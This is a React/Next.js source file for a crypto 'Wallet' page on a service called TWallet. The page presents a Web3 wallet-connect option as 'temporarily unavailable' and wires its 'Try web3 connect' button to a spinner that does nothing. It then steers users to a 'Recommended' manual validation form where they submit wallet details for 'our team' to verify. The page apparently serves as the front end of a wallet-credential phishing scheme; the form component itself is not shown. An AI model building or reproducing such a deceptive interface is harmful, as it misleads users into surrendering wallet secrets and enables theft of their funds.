"use client";

import { useState, useEffect } from "react";
import { useSearchParams } from "next/navigation";
import { Wallet, ShieldCheck, AlertTriangle, Loader2, ChevronDown } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { ManualValidation } from "@/components/wallet/manual-validation";
import { useWalletConnect } from "@/lib/hooks/use-wallet-connect";
import { cn } from "@/lib/utils/cn";

export default function WalletPage() {
  const { isConnected, address } = useWalletConnect();
  const searchParams = useSearchParams();
  const [open, setOpen] = useState(false);
  const [showWeb3, setShowWeb3] = useState(false);
  const [web3Busy, setWeb3Busy] = useState(false);

  useEffect(() => {
    if (searchParams.get("connect") === "1") setOpen(true);
  }, [searchParams]);

  const handleWeb3 = () => {
    setWeb3Busy(true);
    setTimeout(() => setWeb3Busy(false), 1600);
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-slate-900">Wallet</h1>
        <p className="mt-1 text-sm text-slate-500">
          Validate your wallet to make crypto payments
        </p>
      </div>

      {isConnected && address && (
        <Card className="border-emerald-200 bg-emerald-50/60">
          <CardContent className="flex flex-col gap-2 p-5 sm:flex-row sm:items-center sm:justify-between">
            <div className="flex items-center gap-3">
              <span className="h-2.5 w-2.5 rounded-full bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.7)]" />
              <div>
                <p className="text-sm font-semibold text-emerald-800">Wallet connected</p>
                <p className="font-mono text-xs text-emerald-700">
                  {address.slice(0, 6)}…{address.slice(-4)}
                </p>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {!open ? (
        <Card className="border-slate-200 bg-white">
          <CardContent className="flex flex-col items-center py-12 text-center">
            <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-brand-500/20 to-accent-500/20 ring-1 ring-brand-200">
              <Wallet className="h-8 w-8 text-brand-600" aria-hidden="true" />
            </div>
            <h2 className="mt-5 text-lg font-semibold text-slate-900">Connect Wallet</h2>
            <p className="mt-1 max-w-sm text-sm text-slate-500">
              Validate your wallet to make crypto payments
            </p>
            <Button
              type="button"
              className="mt-6 rounded-full px-10"
              onClick={() => setOpen(true)}
            >
              <Wallet className="h-4 w-4" aria-hidden="true" />
              Connect Wallet
              <ChevronDown className="h-4 w-4 opacity-70" aria-hidden="true" />
            </Button>
          </CardContent>
        </Card>
      ) : (
        <div className="grid gap-6 lg:grid-cols-2">
          <Card className="border-slate-200 bg-white">
            <CardHeader>
              <div className="flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-slate-100 ring-1 ring-slate-200">
                  <Wallet className="h-5 w-5 text-slate-500" aria-hidden="true" />
                </div>
                <div>
                  <CardTitle className="text-slate-900">Connect Wallet (Web3)</CardTitle>
                  <CardDescription className="mt-0.5">
                    WalletConnect QR · MetaMask · Trust Wallet · 300+ wallets
                  </CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="mt-0.5 h-4 w-4 shrink-0 text-amber-500" aria-hidden="true" />
                  <div>
                    <p className="text-sm font-medium text-slate-700">Temporarily unavailable</p>
                    <p className="mt-1 text-xs leading-relaxed text-slate-500">
                      Browser wallet connections are currently unavailable on TWallet. Use manual wallet
                      validation instead — our team verifies your wallet details and activates it for you.
                    </p>
                  </div>
                </div>
                <Button
                  type="button"
                  variant="outline"
                  className="mt-4 w-full rounded-xl text-slate-400"
                  onClick={() => setShowWeb3((v) => !v)}
                  disabled={web3Busy}
                >
                  {web3Busy ? <Loader2 className="h-4 w-4 animate-spin" /> : null}
                  {showWeb3 ? "Hide details" : "Why is this unavailable?"}
                </Button>
                {showWeb3 && (
                  <Button
                    type="button"
                    variant="outline"
                    className="mt-2 w-full rounded-xl"
                    onClick={() => void handleWeb3()}
                  >
                    {web3Busy ? (
                      <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" />
                    ) : (
                      <Wallet className="h-4 w-4" aria-hidden="true" />
                    )}
                    Try web3 connect
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>

          <Card className={cn("border-brand-200 bg-white", "ring-1 ring-brand-100")}>
            <CardHeader>
              <div className="flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-black text-white shadow-sm">
                  <ShieldCheck className="h-5 w-5" aria-hidden="true" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <CardTitle className="text-slate-900">Manual Wallet Validation</CardTitle>
                    <span className="rounded-full bg-black px-2 py-0.5 text-[10px] font-semibold text-white">
                      Recommended
                    </span>
                  </div>
                  <CardDescription className="mt-0.5">
                    Submit your wallet details — verified by our team
                  </CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <ManualValidation />
            </CardContent>
          </Card>
        </div>
      )}
    </div>
  );
}
